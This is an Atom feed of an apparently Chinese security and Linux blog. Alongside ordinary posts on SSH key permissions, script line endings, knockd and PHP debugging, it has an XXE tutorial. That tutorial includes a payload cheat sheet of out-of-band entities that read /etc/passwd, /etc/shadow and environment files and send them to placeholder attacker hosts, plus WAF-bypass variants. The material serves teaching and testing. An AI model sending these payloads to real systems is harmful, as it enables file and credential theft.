@@ -1,0 +1,1105 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>FlamePeak</title>
+  <subtitle>We know something, but we do not know more.</subtitle>
+  <link href="/atom.xml" rel="self"/>
+  
+  <link href="http://flamepeak.com/"/>
+  <updated>2020-01-22T07:47:23.032Z</updated>
+  <id>http://flamepeak.com/</id>
+  
+  <author>
+    <name>FlamePeak</name>
+    
+  </author>
+  
+  <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>SSH permissions are too open error</title>
+    <link href="http://flamepeak.com/2020/01/22/SSH-permissions-are-too-open-error/"/>
+    <id>http://flamepeak.com/2020/01/22/SSH-permissions-are-too-open-error/</id>
+    <published>2020-01-22T07:45:16.000Z</published>
+    <updated>2020-01-22T07:47:23.032Z</updated>
+    
+    <content type="html"><![CDATA[<p>Linux中遇到如下错误，</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~/Downloads# ssh -i prikeyfile  joanna@10.10.10.171</span><br><span class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @</span><br><span class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">Permissions 0777 for &apos;prikey&apos; are too open.</span><br><span class="line">It is required that your private key files are NOT accessible by others.</span><br><span class="line">This private key will be ignored.</span><br><span class="line">Load key &quot;prikey&quot;: bad permissions</span><br><span class="line">joanna@10.10.10.171&apos;s password: </span><br><span class="line">Permission denied, please try again.</span><br></pre></td></tr></table></figure>
+<p>这个prikeyfile是自己保存的，权限设的高</p>
+<p>遇到这个问题，需要把权限调低</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Keys need to be only readable by you:</span><br><span class="line"></span><br><span class="line">chmod 400 ~/.ssh/id_rsa</span><br><span class="line"></span><br><span class="line"># If Keys need to be read-writable by you:</span><br><span class="line"></span><br><span class="line">chmod 600 ~/.ssh/id_rsa</span><br></pre></td></tr></table></figure>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;Linux中遇到如下错误，&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;root@kali:~/Downloads# ssh -i prike
+    
+    </summary>
+    
+      <category term="Linux" scheme="http://flamepeak.com/categories/Linux/"/>
+    
+    
+      <category term="Linux" scheme="http://flamepeak.com/tags/Linux/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>/bin/bash^M: bad interpreter: No such file or directory</title>
+    <link href="http://flamepeak.com/2020/01/22/%C2%96-bin-bash-M-bad-interpreter-No-such-file-or-directory/"/>
+    <id>http://flamepeak.com/2020/01/22/-bin-bash-M-bad-interpreter-No-such-file-or-directory/</id>
+    <published>2020-01-22T04:33:06.000Z</published>
+    <updated>2020-01-22T12:02:29.666Z</updated>
+    
+    <content type="html"><![CDATA[<p>在运行<code>.sh</code>脚本时遇到这样的错误<code>/bin/bash^M: bad interpreter: No such file or directory</code>，Google之后才找到原因</p>
+<p>在Windows中编写的脚本，直接在Linux下运行就可能会出现这样的问题。</p>
+<p>解决办法是：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sed -i -e <span class="string">'s/\r$//'</span> scriptname.sh</span><br><span class="line">./scriptname.sh</span><br></pre></td></tr></table></figure>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;在运行&lt;code&gt;.sh&lt;/code&gt;脚本时遇到这样的错误&lt;code&gt;/bin/bash^M: bad interpreter: No such file or directory&lt;/code&gt;，Google之后才找到原因&lt;/p&gt;
+&lt;p&gt;在Windows中编写的脚本，直接在
+    
+    </summary>
+    
+      <category term="Linux" scheme="http://flamepeak.com/categories/Linux/"/>
+    
+    
+      <category term="Linux" scheme="http://flamepeak.com/tags/Linux/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>kali 安装 knock</title>
+    <link href="http://flamepeak.com/2020/01/16/kali-install-knock-20200116/"/>
+    <id>http://flamepeak.com/2020/01/16/kali-install-knock-20200116/</id>
+    <published>2020-01-16T03:06:56.000Z</published>
+    <updated>2020-01-16T03:08:22.466Z</updated>
+    
+    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install knockd</span><br></pre></td></tr></table></figure>
+<p>关于Knock的原理与使用请参考鸟哥的教程</p>
+<p><a href="http://linux.vbird.org/linux_security/knockd.php" target="_blank" rel="noopener">使用 knock 管理防火牆</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sudo apt-get install knockd&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/t
+    
+    </summary>
+    
+      <category term="Linux" scheme="http://flamepeak.com/categories/Linux/"/>
+    
+    
+      <category term="Kali" scheme="http://flamepeak.com/tags/Kali/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>PHP Debugging</title>
+    <link href="http://flamepeak.com/2019/12/16/PHP-debugging-20191216/"/>
+    <id>http://flamepeak.com/2019/12/16/PHP-debugging-20191216/</id>
+    <published>2019-12-16T07:07:04.000Z</published>
+    <updated>2019-12-17T01:07:06.955Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="dumping-variables-to-stdout"><a class="markdownIt-Anchor" href="#dumping-variables-to-stdout"></a> Dumping variables to stdout</h3>
+<ul>
+<li><strong>var_dump ($var)</strong> dumps the variable type and value to stdout.</li>
+<li><strong>print_r ($var)</strong> prints the variable value in human-readable form to stdout.</li>
+<li><strong>get_defined_vars()</strong> gets all the defined variables including built-ins and custom variables (print_r to view them).</li>
+<li><strong>debug_zval_dump ($var)</strong> dumps the variable with its reference counts. This is useful when there are multiple paths to update a single reference.</li>
+<li><strong>debug_print_backtrace()</strong> prints a backtrace that shows the current function call-chain.</li>
+<li><strong>debug_backtrace()</strong> gets the backtrace. You can print_r, log it to a file, or send it to a logging endpoint asynchronously.</li>
+</ul>
+<p>eg:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$myVar = <span class="string">"hello world!"</span>;</span><br><span class="line"></span><br><span class="line">var_dump($myVar);</span><br><span class="line">print_r($myVar);</span><br><span class="line"></span><br><span class="line">$allVars = get_defined_vars();</span><br><span class="line">print_r($allVars);</span><br><span class="line">debug_zval_dump($allVars);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sayHello</span><span class="params">($hello)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> $hello;</span><br><span class="line">    debug_print_backtrace();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sayHello($myVar);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><a href="https://paiza.io/en/projects/new?language=php" target="_blank" rel="noopener">Test PHP online</a></p>
+<h3 id="switching-error-reporting-level"><a class="markdownIt-Anchor" href="#switching-error-reporting-level"></a> Switching error reporting level</h3>
+<p>PHP has a few ways to configure error reporting. You can use the <code>php.ini</code> file, if you have access to it. Otherwise, you might use the <code>htaccess</code> configuration. If you can’t use configuration files, you have the option of changing the values via a script.</p>
+<ul>
+<li><strong>error_reporting</strong> sets the level of logging. <strong>E_NOTICE</strong> is useful during development since it will tell you about defects such as unassigned variables.</li>
+<li><strong>display_errors</strong> tells PHP if and where to display error messages.</li>
+<li><strong>display_startup_errors</strong> should only be used when debugging.</li>
+<li><strong>log_errors</strong> and <strong>error_log</strong> work together to send errors to a log file. Do this in production rather than displaying them to end users.</li>
+</ul>
+<h3 id="php-debugging-tools"><a class="markdownIt-Anchor" href="#php-debugging-tools"></a> PHP debugging tools</h3>
+<p>You can debug PHP using one of many debugging tools to attach a debugger client. <a href="https://www.jetbrains.com/help/phpstorm/php-debugging-session.html" target="_blank" rel="noopener">PhpStorm</a> works with debug utilities like <a href="https://xdebug.org/docs/" target="_blank" rel="noopener">Xdebug</a> and <a href="http://www.zend.com/en/products/studio/downloads" target="_blank" rel="noopener">ZendDebugger</a>.</p>
+<p>Being a polyglot, I need an IDE that supports multiple languages, so I’m opting for <a href="https://code.visualstudio.com/" target="_blank" rel="noopener">VS Code</a> these days.</p>
+<ol>
+<li><a href="https://xdebug.org/docs/install" target="_blank" rel="noopener">Install XDebug</a></li>
+</ol>
+<p>I highly recommend you make a simple <code>test.php</code> file, put a <code>phpinfo();</code> statement in there, then copy the output and paste it into the <a href="https://xdebug.org/wizard.php" target="_blank" rel="noopener">XDebug installation wizard</a>. It will analyze it and give you tailored installation instructions for your environment.</p>
+<ol start="2">
+<li><a href="https://xdebug.org/docs/install#configure-php" target="_blank" rel="noopener">Configure PHP to use XDebug</a></li>
+</ol>
+<p><a href="https://xdebug.org/docs/install#configure-php" target="_blank" rel="noopener">Configure PHP to use XDebug</a> by adding <code>zend_extension=path/to/xdebug</code> to your php.ini. The path of your php.ini is shown in your <code>phpinfo()</code> output under “Loaded Configuration File”.</p>
+<ol start="3">
+<li>Enable remote debugging in your <code>php.ini</code>:</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">; allow remote debugging</span><br><span class="line">[XDebug]</span><br><span class="line">xdebug.remote_enable = 1</span><br><span class="line">xdebug.remote_autostart = 1</span><br></pre></td></tr></table></figure>
+<ol start="4">
+<li>
+<p>If you are doing web development, don’t forget to restart your webserver to reload the settings.</p>
+</li>
+<li>
+<p>Verify your installation by checking your <code>phpinfo()</code> output for an XDebug section.</p>
+</li>
+</ol>
+<h3 id="vscode-error"><a class="markdownIt-Anchor" href="#vscode-error"></a> VScode Error</h3>
+<ol>
+<li><strong>setting php.validate.executablePath</strong></li>
+</ol>
+<p>Go to File&gt; Preferences &gt; Settings …</p>
+<p>输入框中输入php，修改 <code>PHP › Validate: Executable Path</code> 下<code>Eidit in settings.json</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;php.validate.executablePath&quot;: &quot;C:\\xampp\\php\\php.exe&quot;,</span><br><span class="line">&quot;php.executablePath&quot;: &quot;C:\\php7.1\\php.exe&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>参考：</p>
+<p><a href="https://stackify.com/php-debugging-guide/" target="_blank" rel="noopener">A Detailed Guide to PHP Debugging</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;dumping-variables-to-stdout&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#dumping-variables-to-stdout&quot;&gt;&lt;/a&gt; Dumping variables to stdout&lt;/h3&gt;
+
+    
+    </summary>
+    
+      <category term="Web前端" scheme="http://flamepeak.com/categories/Web%E5%89%8D%E7%AB%AF/"/>
+    
+    
+      <category term="PHP" scheme="http://flamepeak.com/tags/PHP/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>XXE 成因分析与应用</title>
+    <link href="http://flamepeak.com/2019/12/16/XXE-explanation-and-usage-20191216/"/>
+    <id>http://flamepeak.com/2019/12/16/XXE-explanation-and-usage-20191216/</id>
+    <published>2019-12-16T03:12:37.000Z</published>
+    <updated>2019-12-16T03:15:59.373Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="xxe简介"><a class="markdownIt-Anchor" href="#xxe简介"></a> xxe简介</h3>
+<p>XML External Entity Injection，xml外部实体注入漏洞</p>
+<p>当允许引用外部实体时，通过构造恶意内容可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</p>
+<h3 id="可能的场景"><a class="markdownIt-Anchor" href="#可能的场景"></a> 可能的场景</h3>
+<p>很多的网站都会对xml文件进行解析，解析的时候都有可能出现可用的XXE漏洞，从而被攻击利用，攻击的方法基于实体中可以使用的协议。</p>
+<p>像XML文件作为配置文件的系统（spring、Struts2等）、文档结构说明文件（PDF、RSS等）、图片格式文件（SVG header）,soap通信通信格式，甚至有道题目的参数为Yiruma处理中也涉及到了对xml文件的解析，此外，网上有一些在线XML格式化工具，还有一ctf题目中的将csv文件转化为xml文件的功能，都可能涉及到不安全的XML文件解析从而存在攻击点。</p>
+<h3 id="xxe的成因分析"><a class="markdownIt-Anchor" href="#xxe的成因分析"></a> XXE的成因分析</h3>
+<p>产生原因是XML文档结构和DTD文档类型定义漏洞，参数过滤不严</p>
+<h4 id="xml文档结构"><a class="markdownIt-Anchor" href="#xml文档结构"></a> xml文档结构</h4>
+<p>XML文档有三个部分：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--第一部分：XML申明--&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span> </span><br><span class="line"><span class="comment">&lt;!--第二部分：文档类型定义--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE note [  &lt;!--定义此文档是 note 类型的文档--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT note (to,from,heading,body)&gt;  &lt;!--定义note元素有四个元素--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT to (#PCDATA)&gt;     &lt;!--定义to元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT from (#PCDATA)&gt;   &lt;!--定义from元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT head (#PCDATA)&gt;   &lt;!--定义head元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT body (#PCDATA)&gt;   &lt;!--定义body元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="comment">&lt;!--第三部分：文档元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Dave<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Tom<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>You are a good man<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>第二部分就是xml文档的DTD部分，也是攻击的产生点。</p>
+<h3 id="xxe-payloads"><a class="markdownIt-Anchor" href="#xxe-payloads"></a> XXE Payloads</h3>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">--------------------------------------------------------------</span><br><span class="line">Vanilla, used to verify outbound xxe or blind xxe</span><br><span class="line">--------------------------------------------------------------</span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE r [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT r ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY sp SYSTEM "http://x.x.x.x:443/test.txt"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">r</span>&gt;</span>&amp;sp;<span class="tag">&lt;/<span class="name">r</span>&gt;</span></span><br><span class="line"></span><br><span class="line">---------------------------------------------------------------</span><br><span class="line">OoB extraction</span><br><span class="line">---------------------------------------------------------------</span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE r [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT r ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % sp SYSTEM "http://x.x.x.x:443/ev.xml"&gt;</span></span><br><span class="line"><span class="meta">%sp;</span></span><br><span class="line"><span class="meta">%param1;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">r</span>&gt;</span>&amp;exfil;<span class="tag">&lt;/<span class="name">r</span>&gt;</span></span><br><span class="line"></span><br><span class="line">## External dtd: ##</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">data</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">c:</span>/<span class="attr">windows</span>/<span class="attr">win.ini</span>"&gt;</span></span><br><span class="line">&lt;!ENTITY % param1 "&lt;!ENTITY exfil SYSTEM 'http://x.x.x.x:443/?%data;'&gt;"&gt;</span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------</span><br><span class="line">OoB variation of above (seems to work better against .NET)</span><br><span class="line">----------------------------------------------------------------</span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE r [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT r ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % sp SYSTEM "http://x.x.x.x:443/ev.xml"&gt;</span></span><br><span class="line"><span class="meta">%sp;</span></span><br><span class="line"><span class="meta">%param1;</span></span><br><span class="line"><span class="meta">%exfil;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line">## External dtd: ##</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">data</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">c:</span>/<span class="attr">windows</span>/<span class="attr">win.ini</span>"&gt;</span></span><br><span class="line">&lt;!ENTITY % param1 "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://x.x.x.x:443/?%data;'&gt;"&gt;</span><br><span class="line"></span><br><span class="line">---------------------------------------------------------------</span><br><span class="line">OoB extraction</span><br><span class="line">---------------------------------------------------------------</span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE r [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % data3 SYSTEM "file:///etc/shadow"&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % sp SYSTEM "http://EvilHost:port/sp.dtd"&gt;</span></span><br><span class="line"><span class="meta">%sp;</span></span><br><span class="line"><span class="meta">%param3;</span></span><br><span class="line"><span class="meta">%exfil;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line">## External dtd: ##</span><br><span class="line">&lt;!ENTITY % param3 "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'ftp://Evilhost:port/%data3;'&gt;"&gt;</span><br><span class="line"></span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line">OoB extra ERROR -- Java</span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE r [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % data3 SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % sp SYSTEM "http://x.x.x.x:8080/ss5.dtd"&gt;</span></span><br><span class="line"><span class="meta">%sp;</span></span><br><span class="line"><span class="meta">%param3;</span></span><br><span class="line"><span class="meta">%exfil;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">r</span>&gt;</span><span class="tag">&lt;/<span class="name">r</span>&gt;</span></span><br><span class="line">## External dtd: ##</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % param1 '&lt;!ENTITY &amp;#x25; external SYSTEM "file:///nothere/%payload;"&gt;'&gt; %param1; %external;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line">OoB extra nice</span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [</span></span><br><span class="line"><span class="meta"> &lt;!ENTITY % start "&lt;![CDATA["&gt;</span></span><br><span class="line"><span class="meta"> &lt;!ENTITY % stuff SYSTEM "file:///usr/local/tomcat/webapps/customapp/WEB-INF/applicationContext.xml "&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % end "]]&gt;</span>"&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">dtd</span> <span class="attr">SYSTEM</span> "<span class="attr">http:</span>//<span class="attr">evil</span>/<span class="attr">evil.xml</span>"&gt;</span></span><br><span class="line">%dtd;</span><br><span class="line">]&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;all;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">## External dtd: ##</span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">all</span> "%<span class="attr">start</span>;%<span class="attr">stuff</span>;%<span class="attr">end</span>;"&gt;</span></span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------</span><br><span class="line">File-not-found exception based extraction</span><br><span class="line">------------------------------------------------------------------</span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE test [  </span></span><br><span class="line"><span class="meta">  &lt;!ENTITY % one SYSTEM "http://attacker.tld/dtd-part" &gt;</span></span><br><span class="line"><span class="meta">  %one;</span></span><br><span class="line"><span class="meta">  %two;</span></span><br><span class="line"><span class="meta">  %four;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line">## External dtd: ##</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">three</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">etc</span>/<span class="attr">passwd</span>"&gt;</span></span><br><span class="line">&lt;!ENTITY % two "&lt;!ENTITY % four SYSTEM 'file:///%three;'&gt;"&gt;</span><br><span class="line"></span><br><span class="line">-------------------------^ you might need to encode this % (depends on your target) as: &amp;#x25;</span><br><span class="line"></span><br><span class="line">--------------</span><br><span class="line">FTP</span><br><span class="line">--------------</span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [ </span></span><br><span class="line"><span class="meta">&lt;!ENTITY % asd SYSTEM "http://x.x.x.x:4444/ext.dtd"&gt;</span></span><br><span class="line"><span class="meta">%asd;</span></span><br><span class="line"><span class="meta">%c;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span>&amp;rrr;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## External dtd ##</span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">d</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">proc</span>/<span class="attr">self</span>/<span class="attr">environ</span>"&gt;</span></span><br><span class="line">&lt;!ENTITY % c "&lt;!ENTITY rrr SYSTEM 'ftp://x.x.x.x:2121/%d;'&gt;"&gt;</span><br><span class="line"></span><br><span class="line">---------------------------</span><br><span class="line">Inside SOAP body</span><br><span class="line">---------------------------</span><br><span class="line"><span class="tag">&lt;<span class="name">soap:Body</span>&gt;</span><span class="tag">&lt;<span class="name">foo</span>&gt;</span>&lt;![CDATA[&lt;!DOCTYPE doc [&lt;!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"&gt; %dtd;]&gt;&lt;xxx/&gt;]]&gt;<span class="tag">&lt;/<span class="name">foo</span>&gt;</span><span class="tag">&lt;/<span class="name">soap:Body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">---------------------------</span><br><span class="line">Untested - WAF Bypass</span><br><span class="line">---------------------------</span><br><span class="line"><span class="meta">&lt;!DOCTYPE :. SYTEM "http://"</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE :_-_: SYTEM "http://"</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE &#123;0xdfbf&#125; SYSTEM "http://"</span></span><br></pre></td></tr></table></figure>
+<h4 id="dtd文档类型定"><a class="markdownIt-Anchor" href="#dtd文档类型定"></a> DTD文档类型定</h4>
+<p>1） <strong>DTD内部、外部声明</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">内部DTD：</span><br><span class="line">假如 DTD 被包含在您的 XML 源文件中，它应当通过下面的语法包装在一个 DOCTYPE 声明中：</span><br><span class="line">&lt;!DOCTYPE root-element [element-declarations]&gt;</span><br><span class="line"></span><br><span class="line">外部DTD：</span><br><span class="line">假如 DTD 位于 XML 源文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中：</span><br><span class="line">&lt;!DOCTYPE root-element SYSTEM “filename”&gt;</span><br><span class="line">解析时会调用外部DTD文件filename</span><br></pre></td></tr></table></figure>
+<p>2）  <strong>DTD参数实体、非参数实体</strong></p>
+<p>除了外部和内部的声明之外，DTD的实体还有参数和非参数之分。</p>
+<p>其中参数实体只能在DTD内部(XML的第二部分)以<code>%实体名</code>的方式引用，而非参数实体则可在XML文档元素，也就是XML的第三个部分以<code>&amp;实体名</code>的方式引用</p>
+<p>举例：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">这是一个内部实体+非参数实体，参数在XML文档文档元素部分引用，不能使用协议</span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY name "nMask"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>&amp;name;<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">这是一个外部实体+参数实体，参数在XML文档DTD内部引用，可以使用外部协议</span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % name SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">    %name;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="xxe利用方式"><a class="markdownIt-Anchor" href="#xxe利用方式"></a> XXE利用方式</h3>
+<p>使用hackbar post构造的xml文档，或者burpsuite抓包进行post</p>
+<h4 id="a-有回显的注入"><a class="markdownIt-Anchor" href="#a-有回显的注入"></a> A) 有回显的注入</h4>
+<h5 id="1任意文件读取"><a class="markdownIt-Anchor" href="#1任意文件读取"></a> 1）任意文件读取</h5>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY file SYSTEM "file:///etc/passwd"&gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>&amp;file;<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h5 id="2命令执行"><a class="markdownIt-Anchor" href="#2命令执行"></a> 2）命令执行</h5>
+<p>在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令</p>
